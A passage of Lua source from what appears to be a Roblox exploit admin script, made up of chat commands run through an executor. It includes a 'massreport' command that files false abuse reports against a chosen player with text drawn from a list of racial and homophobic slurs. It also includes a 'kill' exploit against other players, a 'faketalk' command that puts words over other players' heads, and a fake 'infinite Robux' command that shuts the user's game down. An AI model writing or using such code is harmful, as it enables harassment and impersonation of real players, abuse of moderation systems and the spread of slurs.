		return Notify('Exploit Does Not Support This Function!')
	end

	for _, v in next, plrs:GetPlayers() do
		if Args[1] == 'all' then
			setclipboard(v.DisplayName)
			Notify('Copied to clipboard '..v.DisplayName, 3, pfp(v.UserId))
		elseif v == GetPlayer(Args[1]) then
			setclipboard(v.DisplayName)
			Notify('Copied to clipboard '..v.DisplayName, 3, pfp(v.UserId))
		end
	end
end)

AddCommand('copyid', {'copyuserid', 'cuserid'}, 'Copy Player DisplayName', function(Args)
	if not setclipboard then
		return Notify('Exploit Does Not Support This Function!')
	end

	for _, v in next, plrs:GetPlayers() do
		if Args[1] == 'all' then
			setclipboard(v.UserId)
			Notify('Copied to clipboard '..v.UserId, 3, pfp(v.UserId))
		elseif v == GetPlayer(Args[1]) then
			setclipboard(v.UserId)
			Notify('Copied to clipboard '..v.UserId, 3, pfp(v.UserId))
		end
	end
end)

AddCommand('clickdel', {'clickdelete'}, 'Tool Delete', function()
	if plr.Backpack:FindFirstChild('ClickDelete') or plr.Character:FindFirstChild('ClickDelete') then
		if plr.Backpack:FindFirstChild('ClickDelete') then
			plr.Backpack.ClickDelete.Parent = plr.Character
		end
		return Notify('Click 2 Delete')
	end

	local Tool = Instance.new('Tool', plr.Backpack)
	local rbx, rbx2

	Tool.ToolTip = 'Click 2 Delete'
	Tool.CanBeDropped = false
	Tool.RequiresHandle = false
	Tool.Name = 'ClickDelete'
	rbx = Tool.Activated:Connect(function()
		if plr:GetMouse().Target:IsA('Instance') then
			plr:GetMouse().Target:Destroy()
		end
	end)

	rbx2 = plr.CharacterAdded:Connect(function()
		rbx:Disconnect()
		rbx2:Disconnect()
	end)
	Notify('Click 2 Delete')
end)

AddCommand('savepos', {'spos'}, 'Saves Position', function(Args)
	GlobalSavedPosition = GlobalSavedPosition or {}
	SavedPosition = plr.Character.Humanoid.Torso.CFrame

	if Args[1] or insert(GlobalSavedPosition, SavedPosition) then
		GlobalSavedPosition[Args[1]] = SavedPosition
	end

	Notify(format('Saved Position %s', Args[1] and format('as [%s]', Args[1]) or ''), 2)
end)

AddCommand('loadpos', {'lpos'}, 'Loads Saved Position', function(Args)
	loadTo = nil
	GlobalSavedPosition = GlobalSavedPosition or {}

	if Args[1] then
		if not GlobalSavedPosition[Args[1]] then
			return Notify(format('Could not find Position [%s]', Args[1]), 2)
		end

		loadTo = GlobalSavedPosition[Args[1]]
	end

	if not loadTo and not SavedPosition then
		return Notify('No Saved Position found', 2)
	end

	plr.Character:SetPrimaryPartCFrame(loadTo or SavedPosition)
	Notify(format('Loaded Position %s', Args[1] and format('[%s]', Args[1]) or ''), 2)
end)

AddCommand('deletepos', {'delpos', 'dpos', 'removepos', 'rpos'}, 'Removes Saved Position', function(Args)
	GlobalSavedPosition = GlobalSavedPosition or {}

	if Args[1] == 'all' then
		clear(GlobalSavedPosition)
		return Notify('Successfully Cleared Saved Positions')
	end

	if Args[1] and not GlobalSavedPosition[Args[1]] then
		return Notify(format('Could not find Position [%s]', Args[1]), 2)
	end

	if not Args[1] then
		return Notify('Could not find [] in Saved Positions', 2)
	end

	for _, v in next, GlobalSavedPosition do
		if tostring(_) == tostring(Args[1]) then
			remove(GlobalSavedPosition, _)
			_ = nil
		end
	end
	Notify(format('Successfully removed Saved Position [%s]', Args[1]), 2)
end)

AddCommand('fakeleg', {'korbloxleg'}, 'Korblox Leg', function()
	local Leg = plr.Character:FindFirstChild('RightUpperLeg') or plr.Character:FindFirstChild('Right Leg')

	if Leg then
		if Leg:IsA('Part') then
            local Mesh = Instance.new('Mesh', Leg)
            Mesh.MeshId = 'rbxassetid://101851696'
            Mesh.TextureId = 'rbxassetid://101851254'
        elseif Leg:IsA('MeshPart') then
            Leg.MeshId = 'rbxassetid://9598310133'
            Leg.TextureID = 'rbxassetid://902843398'

            plr.Character.RightFoot.Transparency = 1
            plr.Character.RightLowerLeg.Transparency = 1
        end
	end
end)

AddCommand('headsit', {'hsit'}, 'Head sit', function(Args)
	if Args[1] == 'all' or Args[1] == 'others' then
		return Notify('Action not supported.')
	elseif not GetPlayer(Args[1]) then
		return Notify('Could not find Player '.. Args[1])
	end

	_G.IvAdminHeadSit = true
	local Target = GetPlayer(Args[1])
	local HeadSit

	Notify('Head sitting '..Target.DisplayName)
	HeadSit = Heartbeat:Connect(function()
		if not _G.IvAdminHeadSit then
			return HeadSit:Disconnect()
		else
			if plr.Character and plr.Character:FindFirstChild('Humanoid') then
				if Target and Target.Character and Target.Character:FindFirstChild('Humanoid') then
					pcall(function()
						plr.Character.Humanoid.Sit = true
						Target.Character.Head.CanCollide = false
						plr.Character.Humanoid.Torso.Velocity = Vector3.new(0, 0, 0)
						plr.Character:SetPrimaryPartCFrame(Target.Character.Head.CFrame)
					end)
				end
			end
		end
	end)
end)

AddCommand('unheadsit', {'unhsit'}, 'Unhead sit', function()
	_G.IvAdminHeadSit = false
	Notify('Head Sitting NaN')
end)

AddCommand('massreport', {'spamreport'}, 'Mass Report', function(Args)
	if Args[1] == 'all' or Args[1] == 'others' then
		return Notify('Action not supported.')
	elseif not GetPlayer(Args[1]) then
		return Notify('Could not find Player '.. Args[1])
	elseif GetPlayer(Args[1]) and GetPlayer(Args) ~= plr then
		Notify('Mass Reporting: '..GetPlayer(Args[1]).DisplayName)
	else
		return Notify('An Error Occured!')
	end

	local Report = {
		Type = {'Swearing', 'Bullying'},
		Message = {'Gay', 'fvag', 'IsmellBoobs', 'eatdxxk', 'nigur', 'negro', 'pick up the coxtton', 'black boy', 'monkey'}
	}

	plrs:ReportAbuse(GetPlayer(Args[1]), Report.Type[random(1, #Report.Type)], Report.Message[random(1, #Report.Message)])
end)

AddCommand('longleg', {'giantleg', 'hugeleg', 'tallleg'}, 'Big Leg', function()
	if plr.Character.Humanoid.RigType ~= Enum.HumanoidRigType.R15 then
		Notify('Invalid RigType ' ..plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15)
	end

	local Scales = {'BodyTypeScale', 'BodyProportionScale'}
	
	plr.Character.LeftLowerLeg.LeftKneeRigAttachment.OriginalPosition:Destroy()
	plr.Character.LeftUpperLeg.LeftKneeRigAttachment.OriginalPosition:Destroy()
	plr.Character.LeftLowerLeg.LeftKneeRigAttachment:Destroy()
	plr.Character.LeftUpperLeg.LeftKneeRigAttachment:Destroy()
	
	for _,v in next, plr.Character.Humanoid:GetChildren() do
		if find(Scales, v.Name) then
			repeat wait() until plr.Character.LeftFoot:FindFirstChild('OriginalSize')
			plr.Character.LeftFoot.OriginalSize:Destroy()
			plr.Character.LeftLowerLeg.OriginalSize:Destroy()
			plr.Character.LeftUpperLeg.OriginalSize:Destroy()
			v:Destroy()
		end
	end
end)

AddCommand('longerleg', {'giganticleg'}, 'Bigger Leg', function()
	if plr.Character.Humanoid.RigType ~= Enum.HumanoidRigType.R15 then
		Notify('Invalid RigType ' ..plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15)
	end

	local Scales = {'BodyTypeScale', 'BodyProportionScale', 'BodyWidthScale', 'BodyHeightScale'}
	
	if plr.Character.LeftLowerLeg:FindFirstChild('LeftKneeRigAttachment') then
		plr.Character.LeftLowerLeg.LeftKneeRigAttachment.OriginalPosition:Destroy()
		plr.Character.LeftUpperLeg.LeftKneeRigAttachment.OriginalPosition:Destroy()
		plr.Character.LeftLowerLeg.LeftKneeRigAttachment:Destroy()
		plr.Character.LeftUpperLeg.LeftKneeRigAttachment:Destroy()
	end
	
	for _,v in next, plr.Character.Humanoid:GetChildren() do
		if find(Scales, v.Name) then
			repeat wait() until plr.Character.LeftFoot:FindFirstChild('OriginalSize')
			plr.Character.LeftFoot.OriginalSize:Destroy()
			plr.Character.LeftLowerLeg.OriginalSize:Destroy()
			plr.Character.LeftUpperLeg.OriginalSize:Destroy()
			v:Destroy()
		end
	end
end)

AddCommand('superleg', {'biggestleg'}, 'VERY HUGE Leg', function()
	if plr.Character.Humanoid.RigType ~= Enum.HumanoidRigType.R15 then
		Notify('Invalid RigType ' ..plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15)
	end

	local Scales = {'BodyTypeScale', 'BodyProportionScale', 'BodyWidthScale', 'BodyHeightScale', 'BodyDepthScale', 'HeadScale'}
	
	if plr.Character.LeftLowerLeg:FindFirstChild('LeftKneeRigAttachment') then
		plr.Character.LeftLowerLeg.LeftKneeRigAttachment.OriginalPosition:Destroy()
		plr.Character.LeftUpperLeg.LeftKneeRigAttachment.OriginalPosition:Destroy()
		plr.Character.LeftLowerLeg.LeftKneeRigAttachment:Destroy()
		plr.Character.LeftUpperLeg.LeftKneeRigAttachment:Destroy()
	end
	
	for _,v in next, plr.Character.Humanoid:GetChildren() do
		if find(Scales, v.Name) then
			repeat wait() until plr.Character.LeftFoot:FindFirstChild('OriginalSize')
			plr.Character.LeftFoot.OriginalSize:Destroy()
			plr.Character.LeftLowerLeg.OriginalSize:Destroy()
			plr.Character.LeftUpperLeg.OriginalSize:Destroy()
			v:Destroy()
		end
	end
end)

AddCommand('small', {'smurf', 'midget'}, '5\'11 > hehe', function()
	if plr.Character.Humanoid.RigType ~= Enum.HumanoidRigType.R15 then
		Notify('Invalid RigType ' .. plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15)
	else
		if plr.Character.Humanoid.BodyHeightScale.Value > 0.9 then
			return Notify('Height Scale must be at lowest!', 2)
		end
	end

	local Scales = {'BodyTypeScale', 'BodyWidthScale', 'BodyDepthScale', 'HeadScale'}
	for _, v in next, Scales do
		for _, v2 in next, plr.Character:GetDescendants() do
			if v2:IsA('Vector3Value') or (v2:IsA('StringValue') and v2.Name == 'AvatarPartScaleType') then
				v2:Destroy()
			end
		end
		if plr.Character.Humanoid:FindFirstChild(v) then
			plr.Character.Humanoid[v]:Destroy()
			wait(0.3)
		end
	end
end)

AddCommand('pp', {}, 'Men ;)', function(Args)
	local Tool = plr.Character:FindFirstChildOfClass('Tool') or plr.Backpack:FindFirstChildOfClass('Tool')

	if not Tool then
		return Notify('Tool Required!')
	end

	if Args[1] == 'grip' then
		Tool.Parent = plr.Backpack; task.wait()
		Tool.Grip = CFrame.new(0, 2, -1.5) * CFrame.Angles(0, rad(90), 0)
		Tool.Parent = plr.Character
	elseif Args[1] == 'net' then
		local Start, Max, cm = 0, 2, false
		Tool.Parent = plr.Character
		Tool.Handle:BreakJoints()
	
		local a, b, c =
		Instance.new('BodyPosition', Tool.Handle),
		Instance.new('BodyGyro', Tool.Handle),
		{}

		a.Name = '$'
		b.Name = '$$'
	
		a.P = 200000
		b.P = 13000
	
		a.MaxForce = Vector3.new(huge, huge, huge)
		b.MaxTorque = Vector3.new(huge, huge, huge)
		a.Position = plr.Character.HumanoidRootPart.CFrame.Position
	
		c['D1'] = Tool.Unequipped:Connect(function()
			a:Destroy()
			b:Destroy()
			c['D1']:Disconnect()
			c['D2']:Disconnect()
            Tool.Handle.Massless = true
			Tool.Handle.Velocity = Vector3.new(0, 0, 0)
		end)
	
		c['D2'] = Heartbeat:Connect(function()
			local Pos = plr.Character.HumanoidRootPart.CFrame
			local Pos2 = Pos.Position
	
			Tool.Handle.Velocity = Vector3.new(0, 30, 0)
			a.Position = ((Pos + Pos.LookVector) * CFrame.new(0, -1, -0.5 + cos(-tick() * 10))).Position
			b.CFrame = Pos * CFrame.Angles(0, rad(90), 0)
		end)
	elseif not Args[1] then
		Tool.Parent = plr.Backpack; task.wait()
		Tool.Grip = CFrame.new(0, 2, -1.5) * CFrame.Angles(0, rad(90), 0)
		Tool.Parent = plr.Character
	end
end)

AddCommand('bigpp', {}, 'More men :chad:', function()
	plr.Character.Humanoid:UnequipTools()
	if maxn(plr.Backpack:GetChildren()) <= 1 then
		return Notify('2+ Tools required')
	end

	plr.Backpack:FindFirstChildWhichIsA('Tool').Grip = CFrame.new(0, 1.8, -1.2) * CFrame.Angles(0, rad(90), 0)
	plr.Backpack:FindFirstChildWhichIsA('Tool').Parent = plr.Character
    plr.Backpack:FindFirstChildWhichIsA('Tool').Handle.Massless = true
	for _, v in next, plr.Backpack:GetChildren() do
		v.Grip = CFrame.new(_ * 2.5, 1.8 + -rad(_ * 5), -1.2) * CFrame.Angles(0, rad(90), 0)
		v.Parent = plr.Character
        v.Handle.Massless = true
	end
end)

AddCommand('antivoid', {'avoid'}, 'Prevents being Voided', function()
    -- // Anti Void
	local Tools = {}
	local foreach = function(Table, Code)
		for _, v in next, Table do
			Code(_, v)
		end
	end

	local NewTool = function(Tool)
		if Tool:IsA('Tool') then
			if not find(Tools, Tool) then
				insert(Tools, Tool)
				local rbx;rbx = Tool:GetPropertyChangedSignal('Parent'):Connect(function()
					local NewParent = Tool:FindFirstAncestorWhichIsA('Player') or Tool:FindFirstAncestorWhichIsA('Model') or Tool.Parent
		
					if NewParent.Name ~= plr.Name then
						if find(Tools, Tool) then
							foreach(Tools, function(_, v)
								if v == Tool then
									remove(Tools, _)
									rbx:Disconnect()
									return
								end
							end)
						end
					end
				end)
			end
		end
	end

	plr.CharacterAdded:Connect(function()
		foreach(plr.Backpack:GetChildren(), function(_, v)
			NewTool(v)
		end)
	end)

	plr.Backpack.ChildAdded:Connect(function(Tool)
		NewTool(Tool)
	end)

	foreach(plr.Backpack:GetChildren(), function(_, v)
		NewTool(v)
	end)

	if plr.Character then
		foreach(plr.Character:GetChildren(), function(_, v)
			NewTool(v)
		end)
	end

	Heartbeat:Connect(function()
		if plr.Character then
			local Lpos = plr.Character:GetModelCFrame()
			local Tool = plr.Character:FindFirstChildWhichIsA('Tool')
			if Tool and not find(Tools, Tool) then
				Tool.Handle:BreakJoints()
				Tool.Parent = plr.Backpack

				for i = 1, 50 do
					task.spawn(function()
						plr.Character.HumanoidRootPart.CFrame = Lpos
						plr.Character:SetPrimaryPartCFrame(Lpos);Heartbeat:Wait()
					end)
		
					task.spawn(function()
						plr.Character.HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
						plr.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0);Heartbeat:Wait()
					end)
				end

				-- // Just in case
				for i = 1, 50 do
					task.spawn(function()
						plr.Character.HumanoidRootPart.CFrame = Lpos
						plr.Character:SetPrimaryPartCFrame(Lpos);Heartbeat:Wait()
					end)
				end
			end
		end
	end)
end)

AddCommand('infiniterobux', {'infrobux', 'freerobux'}, 'Gain Unlimited Robux!', function()
	Notify('Generating...', 4, 'rbxassetid://862638100')
	local SFX = Instance.new('Sound', game)
	SFX.SoundId = 'rbxassetid://3200130016'
	SFX.Name = 'Infinite Robux'
	SFX.Volume = 10
	SFX.Looped = true
	SFX.Playing = true
	SFX:Play()

	wait(4.5)
	for i = 1, 1000 do
		Notify(format('Generating Robux: %d', i), 1, '862638100'); task.wait()
	end
	game:Shutdown()
end)

AddCommand('bodyvisualizer', {'bodyviz', 'visbody'}, 'Visualizer with Character', function(Args)
	if not Args[1] then
		return Notify('Missing Argument!')
	end

	local Void = plr.Character.HumanoidRootPart.CFrame
	local Excluded = {'Torso', 'Head', 'LowerTorso', 'UpperTorso', 'HumanoidRootPart'}
	local Vars = {
		Mode = toNum(Args[1]),
		SPMV = 1,
		Speed = 2,
		Distance = 10,
		BPMovers = {},
		Visualizing = false,
	}

	if toNum(Args[1]) > 2 or toNum(Args[1]) <= 0 then
		return Notify('Invalid Mode\nModes: 1 or 2', 4)
	end

	plr.Character:SetPrimaryPartCFrame(Void * CFrame.new(0, 10000, 0))
	plr.Character.HumanoidRootPart.Anchored = true
	wait(1)

	Vars.Visualizing = true
	for _, v in next, plr.Character:GetDescendants() do
		if v:IsA('BasePart') and not find(Excluded, v.Name) then
			v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
			v.CanCollide = false
			v:BreakJoints()

			local Part = Instance.new('Part', v)
			local Align = Instance.new('AlignPosition', v)
			local Attachment0 = Instance.new('Attachment', v)
			local Attachment1 = Instance.new('Attachment', Part)

			Part.Transparency = 1
			Part.Size = v.Size
			Part.Anchored = true
			Part.Massless = true
			Part.CanCollide = false
			Align.ApplyAtCenterOfMass = false
			Align.ReactionForceEnabled = false
			Align.RigidityEnabled = false
			Align.MaxForce = 10000
			Align.MaxVelocity = huge
			Align.Responsiveness = huge
			Align.Attachment0 = Attachment0
			Align.Attachment1 = Attachment1
			insert(Vars.BPMovers, Part)
		end
	end

	for _, v in next, plr.Character:GetDescendants() do
		if v:IsA('BasePart') and v.Name ~='HumanoidRootPart' then
			Heartbeat:connect(function()
				v.Velocity = Vector3.new(90, 300, 90)
				v.RotVelocity = Vector3.new(90, 300, 90)
			end)
		end
	end

	plr.CharacterAdded:Connect(function()
		Vars.Visualizing = false
	end)

	spawn(function()
		while Vars.Visualizing and Heartbeat:Wait() do
			Vars.SPMV = (Vars.SPMV >= 360 and 1 or Vars.SPMV + Vars.Speed)
			for _, v in next, Vars.BPMovers do
				local Modes = {
					CFrame.fromEulerAnglesXYZ(cos(tick()), rad(Vars.SPMV + (360 / #Vars.BPMovers) * _ + Vars.Speed), sin(tick() * _)),
					CFrame.fromEulerAnglesXYZ(0, rad(Vars.SPMV + (360 / #Vars.BPMovers) * _ + Vars.Speed), 0),
				}

				pcall(function()
					v.CFrame = plr.Character.HumanoidRootPart.CFrame * Modes[Vars.Mode] * CFrame.new(Vars.Distance, 0, 0)
				end)
			end
		end
	end)

	plr.Character:SetPrimaryPartCFrame(Void)
	plr.Character.HumanoidRootPart.Anchored = false
	for _, v in next, plr.Character.Humanoid:GetPlayingAnimationTracks() do
		v:Stop()
	end
end)

AddCommand('fieldofview', {'fov'}, 'Field Of View', function(Args)
	workspace.CurrentCamera.FieldOfView = Args[1] or 70
end)

AddCommand('xray', {}, 'Xray', function()
	if _G.IvAdminXRay then
		for _, v in next, _G.IvAdminXRay do
			v[1].Transparency = v[2]
		end
	end

	_G.IvAdminXRay = {}
	Notify('Xray: Loading', 1)
	for _, v in next, workspace:GetDescendants() do
		if v:IsA('BasePart') and v.Transparency ~= 1 then
			local DescendantOfModel = v:FindFirstAncestorOfClass('Model')
			if (DescendantOfModel and not DescendantOfModel:FindFirstChild('Humanoid')) or not DescendantOfModel then
				insert(_G.IvAdminXRay, {v, v.Transparency})
				v.Transparency = 0.3
			end
		end
	end
	Notify('Xray: Enabled')
end)

AddCommand('unxray', {'noxray'}, 'No Xray', function()
	if _G.IvAdminXRay then
		for _, v in next, _G.IvAdminXRay do
			v[1].Transparency = v[2]
		end
		Notify('Xray: Disabled')
	end
end)

AddCommand('graphiclevel', {'glevel'}, 'change graphic level', function(Args)
    local GraphicLevel = toNum(Args[1])

    if GraphicLevel or Notify('Argument must be number!') then
        settings().Rendering.QualityLevel = GraphicLevel
    end
end)

AddCommand('mastervolume', {'mvolume'}, 'change sound level', function(Args)
    local SoundLevel = toNum(Args[1])

    if SoundLevel or Notify('Argument must be a number!') then
        UserSettings():GetService('UserGameSettings').MasterVolume = SoundLevel
    end
end)

AddCommand('selfkick', {'sk'}, 'emergency selfkick', function()
    plr:Kick()
end)

AddCommand('selfcrash', {'selfshutdown'}, 'emergency selfcrash/shutdown', function()
    game:Shutdown()
end)

AddCommand('faketalk', {}, 'fake talk someone', function(Args)
    if Args[1] == 'all' or Args[1] == 'others' then
        for _, v in next, GetPlayers() do
            if v ~= plr and GetCharacter(v) then
                remove(Args, 1)
                game:GetService('Chat'):Chat(GetCharacter(v, 'Head'), concat(Args, ' '), 'White')
            end
        end
        return
    end

    local Target = GetPlayer(Args[1])
    if Target then
        remove(Args, 1)
        game:GetService('Chat'):Chat(GetCharacter(Target, 'Head'), concat(Args, ' '), 'White')
    end
end)

AddCommand('ctime', {}, 'Check your current time', function(Args)
    local Hour = os.date('*t')['hour']
    local Minutes = os.date('*t')['min']
	local TimeSign = Hour < 12 and 'AM' or Hour >= 12 and 'PM'

	if Args[1] == 'chat' or Notify(format('Current-Time: %d:%d %s', Hour - 12, Minutes, TimeSign)) then
		ChatRemote:FireServer(format('Current-Time: %d:%d %s', Hour - 12, Minutes, TimeSign), 'All')
	end
end)

AddCommand('rclothe', {'removeclothe'}, 'Remove any cloths <all, shirt, pants>', function(Args)
    if not plr.Character:FindFirstChildWhichIsA('Shirt') and not plr.Character:FindFirstChildWhichIsA('Pants') then
        return Notify('No clothes found!')
    end
    
    if Args[1] == 'all' then
        for _, v in next, plr.Character:GetDescendants() do
            if v:IsA('Shirt') or v:IsA('Pants') then
                v:Remove()
            end
        end
    elseif Args[1] == 'shirt' then
        plr.Character:FindFirstChildWhichIsA('Shirt'):Remove()
    elseif Args[1] == 'pants' then
        plr.Character:FindFirstChildWhichIsA('Pants'):Remove()
	else
		Notify('Remove any cloths <all, shirt, pants>')
    end
end)

AddCommand('givehat', {'givehat'}, 'Give 1 hat to someone (MUST BE A BALD HEAD!)', function(Args)
    if Args[1] == 'all' or Args[1] == 'others' then
        return Notify('Action not supported!')
    elseif GetPlayer(Args[1]) then
		local Target = GetPlayer(Args[1])
        if not Target.Character:FindFirstChildWhichIsA('Accessory') or Notify('This player has accessory!') then
            local Root = GetCharacter(plr, 'HumanoidRootPart')
			local SaveCFrame = Root.CFrame
            local NewHumanoid = plr.Character:FindFirstChild('Humanoid'):Clone()
	
            plr.Character.Humanoid:Remove()
            NewHumanoid.Parent = plr.Character
            for _, v in next, plr.Character:GetDescendants() do
                if v:IsA('Accessory') then
	                firetouchinterest(v.Handle, Target.Character.PrimaryPart, 0)
	                v.Handle.CFrame = Target.Character.PrimaryPart.CFrame; wait()
                end
            end

            plr.CharacterAdded:Wait():WaitForChild('Humanoid')
            plr.Character:SetPrimaryPartCFrame(SaveCFrame)
        end
    end
end)

AddCommand('rig', {'changerig'}, 'Change your RigType! <R6 or R15>', function(Args)
	local CurrentRig = GetCharacter(plr, 'Humanoid')

	if lower(Args[1]) == 'r15' then
		if CurrentRig.RigType ~= Enum.HumanoidRigType.R15 or Notify('Player is already in R15!') then
		    AvatarEditor:PromptSaveAvatar(plr.Character.Humanoid:GetAppliedDescription(), Enum.HumanoidRigType.R15)
		    if AvatarEditor.PromptSaveAvatarCompleted:Wait() == Enum.AvatarPromptResult.Success then
		        Notify('Changing RigType to R15!')
		        local LastCF = CurrentRig.Torso.CFrame
		        CurrentRig:ChangeState(15)
		        plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastCF
		    end
		end
	elseif lower(Args[1]) == 'r6' then
		local CurrentRig = GetCharacter(plr, 'Humanoid')

		if CurrentRig.RigType ~= Enum.HumanoidRigType.R6 or Notify('Player is already in R6!') then
		    AvatarEditor:PromptSaveAvatar(plr.Character.Humanoid:GetAppliedDescription(), Enum.HumanoidRigType.R6)
		    if AvatarEditor.PromptSaveAvatarCompleted:Wait() == Enum.AvatarPromptResult.Success then
		        Notify('Changing RigType to R6!')
		        local LastCF = CurrentRig.Torso.CFrame
		        CurrentRig:ChangeState(15)
		        plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastCF
		    end
		end
	else
		Notify('Invalid RigType!')
	end
end)

AddCommand('beplayer', {'becomeplayer'}, 'Become Someone (Client Sided)', function(Args)
    if Args[1] == 'all' or Args[1] == 'others' then
        return Notify('Action not supported!')
    end

    _G.C = plr.Character

    local Become = GetPlayer(Args[1])

    if Become then
        for _, v in next, workspace:GetDescendants() do
            if v.Name == 'MyClone' then
                v:Remove()
            end
        end

        for _, v in next, game:GetService('Players'):GetPlayers() do
            if v:IsA('Player') and v.Name == tostring(Become['Name']) then
                v.Character['Archivable'] = true

                local Clone = v.Character:Clone()
                Clone.Name = 'MyClone'
                Clone.Parent = workspace

                for _, Random in next, plr.Character:GetDescendants() do
                    if v:IsA('LocalScript') then
                        local LSClone = v:Clone()
                        LSClone.Parent = Clone
                    end
                end

                plr.Character = Clone
                workspace.CurrentCamera.CameraSubject = Clone.Humanoid

                for _, v in next, Clone:GetDescendants() do
                    if v:IsA('LocalScript') then
                        v.Disabled = true
                        v.Disabled = false
                    end
                end
            end
        end
        Notify('Use command <beme> to be normal again.')
    end
end)

AddCommand('beme', {'bemyself', 'becomeme'}, 'Become yourself', function()
    plr.Character = _G.C
    workspace.CurrentCamera.CameraSubject = plr.Character['Humanoid']

    for _, v in next, workspace:GetDescendants() do
        if v.Name == 'MyClone' then
            v:Remove()
        end
    end
end)

AddCommand('getinfo', {}, 'get a player\'s info', function(Args)
    local Target = GetPlayer(Args[1])
    
    if Args[1] == 'all' or Args[1] == 'others' then
        return Notify('This action cannot be supported')
    elseif Target then
        local Joined = os.time() - (Target.AccountAge*86400)
        local Date = os.date('!*t', Joined)

		Notify(format('Name: %s | UserID: %d |\n Age: %d | JoinData: %s/%s/%s', Target.Name, Target.UserId, Target.AccountAge, Date.month, Date.day, Date.year))
    end
end)

AddCommand('walkto', {}, 'Walk to someone', function(Args)
    local Target = GetPlayer(Args[1])
    
    if Args[1] == 'all' or Args[1] == 'others' then
        return Notify('This action cannot be supported')
    elseif Target then
        plr.Character.Humanoid:MoveTo(Target.Character.PrimaryPart['Position'])
    end
end)

AddCommand('gravity', {}, 'change gravity', function(Args)
    workspace.Gravity = toNum(Args[1])
	Notify('Gravity set to ' .. Args[1])
end)

AddCommand('float', {}, 'able to walk on air (E To go up, Q to go down)', function(Args)
    local Float = Instance.new('Part', workspace)
    local Keybinds = {
        Up = 'e',
        Down =  'q',
    }
    
    Float.Name = 'IvAdminFloat'
    Float.Size = Vector3.new(8, 2, 8)
    Float.Anchored = true
    Float.CanCollide = true
    Float.Transparency = 1
    plr:GetMouse().KeyDown:Connect(function(Key)
        if Key == Keybinds.Up then
            Float.Size = Vector3.new(8, 2, 8)
            while InputService:IsKeyDown(Enum.KeyCode[(Keybinds.Up):upper()]) and wait() do
                Float.CFrame = plr.Character.HumanoidRootPart.CFrame - Vector3.new(0, 4, 0)
            end
            Float.Size = Vector3.new(9e9, 2, 9e9)
        elseif Key == Keybinds.Down then
            Float.Size = Vector3.new(8, 2, 8)
            while InputService:IsKeyDown(Enum.KeyCode[(Keybinds.Down):upper()]) and wait() do
                Float.CFrame = plr.Character.HumanoidRootPart.CFrame - Vector3.new(0, 4.5, 0)
            end
            Float.Size = Vector3.new(9e9, 2, 9e9)
        end
    end)
    Notify('E - Up\nQ - Down', 8)
end)

AddCommand('loademotes', {'r15emotes'}, 'Load R15 Emotes Script', function()
	
end)

AddCommand('copyemote', {'cemote'}, 'Copies player Emote', function(Args)
	if Args[1] == 'others' or Args[1] == 'all' or Args[1] == 'me' then
		return Notify('Action not supported!')
	end

	local Player = GetPlayer(Args[1])
	if Player or Notify(format('Could not find player %s', Args[1])) then
		if Player.Character then
			pcall(function()
				for _, v in next, Player.Character.Humanoid:GetPlayingAnimationTracks() do
					local Animation = Instance.new('Animation')
					Animation.AnimationId = v.Animation.AnimationId
					plr.Character.Humanoid:LoadAnimation(Animation):Play()
					break
				end
			end)
		end
	end
end)

AddCommand('copyoutfit', {'copyfit', 'cfit', 'coutfit', 'stealfit'}, 'Copies Player Fit', function(Args)
	if Args[1] == 'all' and Args[1] == 'others' then
		return Notify('Action not supported!')
	end


	local Player = GetPlayer(Args[1])
	if Player or Notify(format('Could not find player %s', Args[1])) then
		local CurrentRig = GetCharacter(plr, 'Humanoid')
		AvatarEditor:PromptSaveAvatar(Player.Character.Humanoid:GetAppliedDescription(), Player.Character.Humanoid.RigType)
		if AvatarEditor.PromptSaveAvatarCompleted:Wait() == Enum.AvatarPromptResult.Success then
		    Notify('Stealing OUTFIT')
		    local LastCF = CurrentRig.Torso.CFrame
		    CurrentRig:ChangeState(15)
		    plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastCF
		end
	end
end)

AddCommand('kill', {}, 'Kill v2 (Supports all executors)', function(Args)
	local Tool = plr.Backpack:FindFirstChildWhichIsA('Tool') or plr.Character:FindFirstChildWhichIsA('Tool')
	local Tool = Tool and Tool.RequiresHandle and Tool
	local Player = GetPlayer(Args[1])
	local firetouchinterest = function(a, b, c)
		local d = a.CFrame
		if firetouchinterest then firetouchinterest(b, a, 0) end
		b.CFrame = a.CFrame
		a.Touched:Wait()
		a.CFrame = d
	end

	if Args[1] == 'all' or Args[1] == 'others' then
		plr.Character.Humanoid:UnequipTools() RenderStepped:Wait()

		local Index = 0
		local Tools = plr.Backpack:GetChildren()
		local LastPosition = plr.Character:GetModelCFrame()
		spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition end)

		if maxn(Tools) > 2 or Notify('2+ tools required') then
			for _, v in next, filter(GetPlayers(), plr) do
				if v.Character and v.Character:FindFirstChild('Humanoid') and v.Character.Humanoid.Health > 0 and not v.Character.Humanoid.SeatPart then
					Heartbeat:Wait()

					Index = Index + 1
					if Tools[Index] then
						local Tool = Tools[Index]
						pcall(function()
							spawn(function()
								local Humanoid = plr.Character.Humanoid:Clone()

								for _, v in next, plr.Character:GetChildren() do
									if v:IsA('Accessory') or v:IsA('Hat') then
										v:ClearAllChildren()
									end
								end

								plr.Character.Animate.Disabled = true
								Humanoid.Parent = plr.Character
								plr.Character.Humanoid:Destroy()
								Tool.Parent = plr.Character
								v.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
								firetouchinterest(Tool.Handle, v.Character.PrimaryPart, 0)
							end)
						end)
					end
				end
			end

			task.wait(0.15)
			plr.Character.Humanoid:ChangeState(15)
		end
	elseif Player or Notify(format('Could not find player %s', Args[1])) then
		if Tool or Notify('Tool required!') then
			if Player.Character.Humanoid.Health == 0 then return end
			local LastPosition = plr.Character:GetModelCFrame()
			local Humanoid = plr.Character.Humanoid:Clone()

			for _, v in next, plr.Character:GetChildren() do
                if v:IsA('Accessory') or v:IsA('Hat') then
                    v:Remove()
                end
            end

			spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition end)
			
